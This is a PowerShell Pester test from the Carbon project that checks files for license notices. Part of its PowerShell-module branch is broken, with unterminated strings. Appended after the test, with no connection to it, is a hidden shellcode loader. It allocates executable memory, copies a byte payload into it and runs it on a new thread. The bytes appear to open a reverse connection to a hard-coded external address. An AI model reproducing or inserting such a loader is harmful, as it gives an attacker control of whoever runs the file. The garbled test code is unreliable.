
Set-StrictMode -Version 'Latest'

Describe 'License Notices' {

    It 'all published files should have a license notice' {
        $projectRoot = Join-Path -Path $PSScriptRoot -ChildPath '..' -Resolve
        $carbonRoot = Join-Path -Path $projectRoot -ChildPath 'Carbon' -Resolve
        $licenseFilePath = Join-Path $projectRoot LICENSE.txt -Resolve
    
        $noticeLines = Get-Content -Path $licenseFilePath -Tail 11 |
                            ForEach-Object { $_ -replace '^   ','' } |
                            Select-Object -First 13
        $noticeLines | Write-Verbose
    
        [object[]]$filesMissingLicense = 
            & {
                Get-ChildItem -Path (Join-Path -Path $projectRoot -ChildPath 'Tools\*.ps1')

                Get-ChildItem -Path $projectRoot -Filter '*.nuspec'

                if( Test-Path -Path 'env:APPVEYOR' )
                {
                    Get-ChildItem -Path $carbonRoot -Recurse -File
                }
                else 
                {
                    $searchRoot = Join-Path -Path $carbonRoot -ChildPath '*'
                    Get-ChildItem -Path $searchRoot -File -Exclude 'Carbon.psm1.*'

                    Get-ChildItem -Path $carbonRoot -Directory -Exclude 'en-US','Functions' |
                        Get-ChildItem -Recurse -File

                    $functionsRoot = Join-Path -Path $carbonRoot -ChildPath 'Functions\*'
                    Get-ChildItem -Path $functionsRoot -Include 'Initialize-Lcm.ps1','Use-CallerPreference.ps1'

                    Get-ChildItem -Path $functionsRoot -Include '*-Iis*.ps1' |
                        Select-Object -First 1
                }

            } |
            Where-Object { $_.Name -notmatch '\.(deps\.json|dll|pdb|orig|txt)$' } |
            ForEach-Object {
                Write-Debug -Message $_.FullName
                $fileInfo = $_
                $file = Get-Content $fileInfo.FullName -Raw
                if( -not $file )
                {
                    $fileInfo.FullName
                    return
                }

                $ok = switch -Regex ( $fileInfo.Extension )
                {
                    '^\.ps(m|d)*1$'
                    {
                        $expectedNotice = $noticeLines -join ('{0}
                        $expectedNotice = '
                        if( $file.StartsWith('<
                        {
                            $file.Contains( $expectedNotice )
                        }
                        else
                        {
                            $file.StartsWith( $expectedNotice )
                        }
                        break
                    }
                    '^\.(ps1xml)$'
                    {
                        $expectedNotice = $noticeLines -join ('{0}   ' -f ([Environment]::NewLine))
                        $expectedNotice = '<?xml version="1.0" encoding="utf-8"?>{0}<!--{0}   {1}{0}-->{0}' -f ([Environment]::NewLine),$expectedNotice
                        $file.StartsWith( $expectedNotice )
                        break
                    }
                    '^\.nuspec$'
                    {
                        $expectedNotice = $noticeLines -join ('{0}   ' -f ([Environment]::NewLine))
                        $expectedNotice = '<?xml version="1.0"?>{0}<!--{0}   {1}{0}-->{0}' -f ([Environment]::NewLine),$expectedNotice
                        $file.StartsWith( $expectedNotice )
                        break
                    }
                    '^\.mof$'
                    {
                        $expectedNotice = $noticeLines -join [Environment]::NewLine
                        $expectedNotice = '/*{0}{1}{0}*/' -f ([Environment]::NewLine),$expectedNotice
                        $file.StartsWith( $expectedNotice )
                        break
                    }
                    default
                    {
                        Write-Verbose $fileInfo.FullName
                        $false
                        break
                    }
                }
                if( -not $ok )
                {
                    Write-Debug -Message $fileInfo.FullName
                    $fileInfo.FullName
                }
            }
    
        if( $filesMissingLicense )
        {
                ,$filesMissingLicense | Should BeNullOrEmpty
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x69,0x79,0xea,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

